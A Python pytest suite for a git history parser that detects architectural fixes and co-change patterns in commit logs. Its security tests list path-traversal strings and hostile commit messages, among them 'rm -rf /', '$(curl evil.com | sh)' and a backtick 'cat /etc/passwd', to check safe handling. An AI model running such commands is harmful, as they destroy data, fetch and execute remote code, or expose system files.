"""
Comprehensive test suite for git history parser.
Tests for real repository interaction, security, and production readiness.
"""

import json
import os
import shutil
import subprocess
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import MagicMock, Mock, patch

import pytest

from tools.pre_audit.git_history_parser import ArchitecturalFix, FileChangePattern, FixType, GitHistoryParser


@pytest.fixture
def real_repo(tmp_path):
    """Create a real git repository with test commits."""
    repo_path = tmp_path / "test_repo"
    repo_path.mkdir()

    # Initialize git repo
    subprocess.run(["git", "init"], cwd=repo_path, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.name", "Test User"], cwd=repo_path, check=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=repo_path, check=True)

    # Create test files and commits
    test_commits = [
        {"files": {"app/auth.py": "# Auth module", "app/models.py": "# Models"}, "message": "Initial commit"},
        {"files": {"app/auth.py": "# Auth module\n# Fixed"}, "message": "Fix ADR-001 compliance issue in auth module"},
        {
            "files": {"app/boundaries/service.py": "# Service boundary"},
            "message": "Resolve layer violation between service and repository",
        },
        {
            "files": {"app/core/base.py": "# Base module", "app/core/interfaces.py": "# Interfaces"},
            "message": "Refactor to improve architectural integrity",
        },
        {
            "files": {"app/auth.py": "# Auth fixed again", "app/models.py": "# Models fixed"},
            "message": "Fix circular dependency between auth and models",
        },
        {
            "files": {"app/architecture/patterns.py": "# Patterns"},
            "message": "Implement architectural patterns from ADR-023",
        },
        {
            "files": {"tests/test_auth.py": "# Tests"},
            "message": "Add tests for auth module",  # Not an architectural fix
        },
    ]

    for i, commit_data in enumerate(test_commits):
        # Create/update files
        for file_path, content in commit_data["files"].items():
            full_path = repo_path / file_path
            full_path.parent.mkdir(parents=True, exist_ok=True)
            full_path.write_text(content)
            subprocess.run(["git", "add", file_path], cwd=repo_path, check=True)

        # Make commit with proper timestamp
        commit_date = datetime.now(timezone.utc) - timedelta(days=len(test_commits) - i)
        env = os.environ.copy()
        env["GIT_AUTHOR_DATE"] = commit_date.isoformat()
        env["GIT_COMMITTER_DATE"] = commit_date.isoformat()
        env["GIT_AUTHOR_NAME"] = "Test User"
        env["GIT_AUTHOR_EMAIL"] = "test@example.com"
        env["GIT_COMMITTER_NAME"] = "Test User"
        env["GIT_COMMITTER_EMAIL"] = "test@example.com"

        subprocess.run(
            ["git", "commit", "-m", commit_data["message"]], cwd=repo_path, check=True, env=env, capture_output=True
        )

    yield repo_path

    # Cleanup
    shutil.rmtree(repo_path)


class TestGitHistoryParserRealRepo:
    """Test with real git repositories."""

    def test_find_architectural_fixes_real_repo(self, real_repo):
        """Test finding architectural fixes in a real repository."""
        parser = GitHistoryParser(real_repo)

        # Find fixes from last 6 months
        fixes = parser.find_architectural_fixes(since_months=6)

        # Verify we found the expected fixes
        assert len(fixes) >= 4  # Should find at least 4 architectural fixes

        # Check fix types
        fix_types = {fix.fix_type for fix in fixes}
        assert FixType.EXPLICIT_ADR_FIX in fix_types
        assert FixType.BOUNDARY_FIX in fix_types
        assert FixType.DEPENDENCY_FIX in fix_types
        assert FixType.REFACTORING_FIX in fix_types

        # Check ADR references
        adr_refs = set()
        for fix in fixes:
            adr_refs.update(fix.adr_references)
        assert "ADR-001" in adr_refs
        assert "ADR-023" in adr_refs

        # Verify commit details
        for fix in fixes:
            assert fix.commit_hash
            assert fix.author == "Test User"
            assert fix.files_changed
            assert fix.confidence > 0
            assert fix.pattern_matched

    def test_adr_filtering_real_repo(self, real_repo):
        """Test filtering by specific ADR."""
        parser = GitHistoryParser(real_repo)

        # Find only ADR-001 related fixes
        fixes = parser.find_architectural_fixes(adr_id="ADR-001")

        assert len(fixes) >= 1
        for fix in fixes:
            assert "ADR-001" in fix.adr_references

    def test_file_change_patterns_real_repo(self, real_repo):
        """Test finding file change patterns."""
        parser = GitHistoryParser(real_repo)

        patterns = parser.find_file_change_patterns(since_months=6, min_frequency=2)

        # Should find auth.py and models.py changing together
        found_auth_models_pattern = False
        for pattern in patterns:
            if "app/auth.py" in pattern.files and "app/models.py" in pattern.files:
                found_auth_models_pattern = True
                assert pattern.frequency >= 2
                assert pattern.is_architectural  # Contains 'core' or 'auth'
                break

        assert found_auth_models_pattern, "Should find auth.py and models.py co-change pattern"

    def test_statistics_real_repo(self, real_repo):
        """Test statistics calculation with real data."""
        parser = GitHistoryParser(real_repo)

        fixes = parser.find_architectural_fixes()
        stats = parser.get_fix_statistics(fixes)

        assert stats["total_fixes"] >= 4
        assert "explicit_adr_fix" in stats["fix_types"]
        assert "boundary_fix" in stats["fix_types"]
        assert len(stats["adr_references"]) >= 2
        assert stats["top_contributors"][0]["author"] == "Test User"
        assert stats["average_confidence"] > 0.5
        assert stats["total_lines_changed"] > 0

    def test_export_formats_real_repo(self, real_repo):
        """Test all export formats with real data."""
        parser = GitHistoryParser(real_repo)
        fixes = parser.find_architectural_fixes()

        # Test JSON export
        json_output = parser.export_fixes_summary(fixes, "json")
        data = json.loads(json_output)
        assert "fixes" in data
        assert "statistics" in data
        assert len(data["fixes"]) == len(fixes)

        # Test CSV export
        csv_output = parser.export_fixes_summary(fixes, "csv")
        lines = csv_output.strip().split("\n")
        assert len(lines) == len(fixes) + 1  # Header + data
        assert "commit_hash,date,author" in lines[0]

        # Test Markdown export
        md_output = parser.export_fixes_summary(fixes, "markdown")
        assert "# Architectural Fixes Summary" in md_output
        assert f"**Total Fixes**: {len(fixes)}" in md_output
        assert "Test User" in md_output


class TestGitHistoryParserSecurity:
    """Security-focused tests."""

    def test_path_traversal_protection(self, tmp_path):
        """Test protection against path traversal attacks."""
        # Try to create parser with path traversal
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            tmp_path / ".." / ".." / "etc",
        ]

        for path in malicious_paths:
            with pytest.raises((ValueError, OSError)):
                GitHistoryParser(path)

    def test_malicious_commit_messages(self, real_repo):
        """Test handling of malicious commit messages."""
        parser = GitHistoryParser(real_repo)

        # Create commits with potentially malicious messages
        malicious_messages = [
            "Fix ADR-001; rm -rf /",  # Command injection attempt
            "Fix $(curl evil.com | sh)",  # Command substitution
            "Fix `cat /etc/passwd`",  # Backtick execution
            "Fix ${PATH}",  # Environment variable
            "Fix \\x00\\x01",  # Null bytes
        ]

        # Parser should handle these safely
        # Note: In a real implementation, we'd create actual commits
        # For now, test the pattern matcher directly
        from tools.pre_audit.git_pattern_matcher import ArchitecturalFixPatternMatcher

        matcher = ArchitecturalFixPatternMatcher()

        for message in malicious_messages:
            # Should not execute any commands or cause errors
            matches = matcher.match_commit(message)
            assert isinstance(matches, list)

    def test_large_repository_dos(self, tmp_path):
        """Test protection against DoS with large repositories."""
        # Create a repo with many commits
        repo_path = tmp_path / "large_repo"
        repo_path.mkdir()

        subprocess.run(["git", "init"], cwd=repo_path, check=True, capture_output=True)
        subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_path, check=True)
        subprocess.run(["git", "config", "user.email", "test@test.com"], cwd=repo_path, check=True)

        # Create initial commit
        (repo_path / "test.txt").write_text("test")
        subprocess.run(["git", "add", "."], cwd=repo_path, check=True)
        subprocess.run(["git", "commit", "-m", "Initial"], cwd=repo_path, check=True)

        parser = GitHistoryParser(repo_path)

        # Test with max_commits limit
        import time

        start = time.time()
        fixes = parser.find_architectural_fixes(max_commits=100)
        elapsed = time.time() - start

        # Should complete quickly even if repo is large
        assert elapsed < 5.0
        assert isinstance(fixes, list)


class TestGitHistoryParserErrorHandling:
    """Test error handling and edge cases."""

    def test_corrupted_repository(self, tmp_path):
        """Test handling of corrupted git repository."""
        repo_path = tmp_path / "corrupted_repo"
        repo_path.mkdir()

        # Create a fake .git directory
        (repo_path / ".git").mkdir()
        (repo_path / ".git" / "config").write_text("invalid git config")

        with pytest.raises(ValueError):
            GitHistoryParser(repo_path)

    def test_empty_repository(self, tmp_path):
        """Test handling of empty repository."""
        repo_path = tmp_path / "empty_repo"
        repo_path.mkdir()

        subprocess.run(["git", "init"], cwd=repo_path, check=True, capture_output=True)

        parser = GitHistoryParser(repo_path)
        fixes = parser.find_architectural_fixes()

        assert fixes == []

        patterns = parser.find_file_change_patterns()
        assert patterns == []

    def test_permission_errors(self, tmp_path):
        """Test handling of permission errors."""
        if os.name == "nt":  # Windows
            pytest.skip("Permission test not applicable on Windows")

        repo_path = tmp_path / "restricted_repo"
        repo_path.mkdir()
        subprocess.run(["git", "init"], cwd=repo_path, check=True, capture_output=True)
        subprocess.run(["git", "config", "user.name", "Test"], cwd=repo_path, check=True)
        subprocess.run(["git", "config", "user.email", "test@test.com"], cwd=repo_path, check=True)

        # Create a test file and commit
        (repo_path / "test.txt").write_text("test")
        subprocess.run(["git", "add", "."], cwd=repo_path, check=True)
        subprocess.run(["git", "commit", "-m", "Fix ADR-001"], cwd=repo_path, check=True)

        # GitHistoryParser should work with read-only repositories
        parser = GitHistoryParser(repo_path)
        fixes = parser.find_architectural_fixes()
        assert isinstance(fixes, list)
        assert len(fixes) >= 1  # Should find the ADR-001 fix

        # Now test with truly restricted permissions on git objects
        # Make .git/objects read-only to simulate permission issues
        git_objects = repo_path / ".git" / "objects"
        original_perms = {}

        try:
            # Store original permissions and make read-only for testing
            for root, dirs, files in os.walk(git_objects):
                for d in dirs:
                    path = os.path.join(root, d)
                    original_perms[path] = os.stat(path).st_mode
                    os.chmod(path, 0o555)  # nosec B103 # Test requires restricted permissions
                for f in files:
                    path = os.path.join(root, f)
                    original_perms[path] = os.stat(path).st_mode
                    os.chmod(path, 0o444)  # nosec B103 # Test requires restricted permissions

            # Parser should still work for reading
            parser2 = GitHistoryParser(repo_path)
            fixes2 = parser2.find_architectural_fixes()
            assert isinstance(fixes2, list)
            assert len(fixes2) >= 1

        finally:
            # Restore permissions for cleanup
            for path, mode in original_perms.items():
                try:
                    os.chmod(path, mode)
                except:
                    pass

    def test_concurrent_access(self, real_repo):
        """Test concurrent access to repository."""
        import queue
        import threading

        results = queue.Queue()
        errors = queue.Queue()

        def worker():
            try:
                parser = GitHistoryParser(real_repo)
                fixes = parser.find_architectural_fixes()
                results.put(len(fixes))
            except Exception as e:
                import traceback

                errors.put(f"{str(e)}\n{traceback.format_exc()}")

        # Start multiple threads
        threads = []
        for _ in range(5):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)

        # Wait for completion
        for t in threads:
            t.join()

        # Check results
        if not errors.empty():
            error_msg = errors.get()
            print(f"\nError in concurrent access: {error_msg}")
        assert errors.empty(), "Concurrent access caused errors"

        # All threads should get same result
        result_counts = []
        while not results.empty():
            result_counts.append(results.get())

        assert len(set(result_counts)) == 1, "Inconsistent results from concurrent access"


class TestGitHistoryParserPerformance:
    """Performance and scalability tests."""

    def test_performance_metrics(self, real_repo):
        """Test and record performance metrics."""
        import time

        parser = GitHistoryParser(real_repo)

        # Measure different operations
        metrics = {}

        # Test find_architectural_fixes
        start = time.time()
        fixes = parser.find_architectural_fixes()
        metrics["find_fixes_time"] = time.time() - start
        metrics["fixes_found"] = len(fixes)

        # Test find_file_change_patterns
        start = time.time()
        patterns = parser.find_file_change_patterns()
        metrics["find_patterns_time"] = time.time() - start
        metrics["patterns_found"] = len(patterns)

        # Test statistics calculation
        start = time.time()
        stats = parser.get_fix_statistics(fixes)
        metrics["stats_time"] = time.time() - start

        # Test export
        start = time.time()
        json_output = parser.export_fixes_summary(fixes, "json")
        metrics["export_json_time"] = time.time() - start
        metrics["export_json_size"] = len(json_output)

        # All operations should be fast
        assert metrics["find_fixes_time"] < 1.0
        assert metrics["find_patterns_time"] < 1.0
        assert metrics["stats_time"] < 0.1
        assert metrics["export_json_time"] < 0.1

        print("\nPerformance Metrics:")
        for key, value in metrics.items():
            print(f"  {key}: {value}")

    def test_memory_usage(self, real_repo):
        """Test memory usage doesn't grow excessively."""
        import gc
        import sys

        if not hasattr(sys, "getsizeof"):
            pytest.skip("getsizeof not available")

        parser = GitHistoryParser(real_repo)

        # Force garbage collection
        gc.collect()

        # Get initial memory baseline
        initial_objects = len(gc.get_objects())

        # Perform operations
        fixes = parser.find_architectural_fixes()
        patterns = parser.find_file_change_patterns()
        stats = parser.get_fix_statistics(fixes)

        # Check memory usage
        final_objects = len(gc.get_objects())
        object_growth = final_objects - initial_objects

        # Should not create excessive objects
        assert object_growth < 10000, f"Too many objects created: {object_growth}"

        # Check size of results
        fixes_size = sys.getsizeof(fixes)
        patterns_size = sys.getsizeof(patterns)

        # Results should be reasonably sized
        assert fixes_size < 1024 * 1024  # Less than 1MB
        assert patterns_size < 1024 * 1024  # Less than 1MB


class TestGitHistoryParserIntegration:
    """Integration tests with other components."""

    def test_integration_with_pattern_matcher(self, real_repo):
        """Test integration with pattern matcher."""
        parser = GitHistoryParser(real_repo)

        # The parser should use the pattern matcher internally
        fixes = parser.find_architectural_fixes()

        # Verify pattern matcher results are properly integrated
        for fix in fixes:
            assert fix.fix_type in FixType
            assert fix.pattern_matched
            assert 0 <= fix.confidence <= 1
            assert isinstance(fix.adr_references, list)

    def test_architectural_file_detection(self):
        """Test architectural file detection logic."""
        parser = GitHistoryParser.__new__(GitHistoryParser)

        # Test various file paths
        test_cases = [
            ("app/architecture/design.py", True),
            ("core/base.py", True),
            ("framework/foundation.py", True),
            ("app/boundaries/service.py", True),
            ("layers/presentation.py", True),
            ("src/arch/patterns.py", True),
            ("module/interfaces.py", True),
            ("component/factory.py", True),
            ("tests/test_user.py", False),
            ("utils/helpers.py", False),
            ("config/settings.py", False),
            ("data/users.json", False),
            ("README.md", False),
        ]

        for file_path, expected in test_cases:
            result = parser._is_architectural_file(file_path)
            assert result == expected, f"Failed for {file_path}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-s"])
